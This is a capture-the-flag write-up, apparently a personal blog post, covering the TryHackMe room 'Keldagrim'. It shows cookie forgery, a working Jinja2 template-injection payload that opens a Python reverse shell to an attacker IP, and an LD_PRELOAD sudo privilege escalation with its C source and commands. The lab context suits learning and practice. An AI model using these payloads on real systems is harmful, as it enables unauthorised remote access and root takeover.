---
layout: post
title:  "THM: Keldagrim"
date:   2021-02-03 20:00:00 +1100
category: hacking
---

## Keldagrim
*The dwarves are hiding their gold!*

This is [Keldagrim](https://tryhackme.com/room/keldagrim) from THM. It's medium rated and I liked it a lot.

## Ports
SSH and HTTP; that's it. We don't use SSH, this is 100% web.

## HTTP
It's a pretty simple website, about selling gold in Runescape and other MMOs (I think). There is a link we can't immediately access at */admin*. Dirsearch doesn't find any links that aren't easily found from the homepage.

Inspecting our request and response, we have a cookie:

>session=Z3Vlc3Q=; Path=/

If we decode the session value, we get: *guest*

If we set the cookie to *admin* (base64 encoded is *YWRtaW4=*), we can access the */admin* page. Nice. We get a new cookie:

>sales=JDIsMTY1

This decodes to: *$2,165*

I got stuck at this point for hours. I should also mention that the Server header was:

>Server: Werkzeug/1.0.1 Python/3.6.9

I tried SQLi in the URL and cookies. I tried fuzzing for hidden parameters. I tried fuzzing for hidden directories. I tried searching for a Werkzeug console.

I could see the server was base64 decoding whatever cookie value I set for *sales*, so I tried getting a command injection. Nada. 

## Progress
The only error I would occasionally manage to prompt was a 500 error. Specifically:

{% highlight html %}
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
{% endhighlight %}

Googling this error, I found it was a *Flask* error. This made sense with *Werkzeug*. This led me to [this](https://book.hacktricks.xyz/pentesting/pentesting-web/flask), and I quote:

>Probably if you are playing a CTF a Flask application will be related to SSTI.

WTF is SSTI? I've never heard of it - down the rabbit hole we go!

## SSTI
This was a very [useful link](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). 

>A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

So it is command injection via the *sales* cookie; we just need the right syntax. And we need to figure out which *template engine* we were using. 

Next was a visit to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) where some research revealed we were most likely dealing with *Jinja2*. I tried some payloads:

{% raw %}
{{4*4}}[[5*5]]  
{{7*'7'}} would result in 7777777  
{{config.items()}}
{% endraw %}

Note these all needed to be base64 encoded first. Thanks to [CyberChef](https://gchq.github.io/CyberChef).

Many of the examples on Payloads didn't seem to work, but enough did that it seemed like I was on the right track. There was code for a reverse shell, and with some slight modification:

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.9.10.123\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{% endraw %}

After base64 encoding, I got a shell! I did a happy dance :)

## Privesc
Privesc was comparatively quick, but again a new one for me at least.

Linpeas points the way, and [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload) draws the map. This is the setup:

{% highlight html %}
jed@keldagrim:/dev/shm$ sudo -l     
sudo -l
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps
{% endhighlight %}

The important part is *env_keep+=LD_PRELOAD* along with something we can run as sudo. It doesn't matter what, and PS by itself doesn't lead directly to a shell. We need this:

{% highlight c %}
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
{% endhighlight %}

I create it on my box and copy it over:

{% highlight shell %}
jed@keldagrim:/tmp$ wget http://10.9.10.123:8000/pe.c
wget http://10.9.10.123:8000/pe.c
--2021-02-03 09:31:19--  http://10.9.10.123:8000/pe.c
Connecting to 10.9.10.123:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 163 [text/x-csrc]
Saving to: ‘pe.c’

pe.c                100%[===================>]     163  --.-KB/s    in 0s      

2021-02-03 09:31:20 (7.71 MB/s) - ‘pe.c’ saved [163/163]
{% endhighlight %}

I compile it per the instructions; it threw a few warnings but they don't matter. Command was:

``
jed@keldagrim:/tmp$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
``

The escalation was supposed to be:

``
jed@keldagrim:/tmp$ sudo LD_PRELOAD=pe.so ps
``

But this threw an error:

>ERROR: ld.so: object 'pe.so' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.

Essentially, the 'pe.so' can't be found. We need to specify the path:

{% highlight shell %}
jed@keldagrim:/tmp$ sudo LD_PRELOAD=/tmp/pe.so ps
sudo LD_PRELOAD=/tmp/pe.so ps
root@keldagrim:/tmp# cd /root
root@keldagrim:/root# id;hostname
id;hostname
uid=0(root) gid=0(root) groups=0(root)
keldagrim
{% endhighlight %}

I liked this one a lot. Thanks [optional](https://tryhackme.com/p/optional).
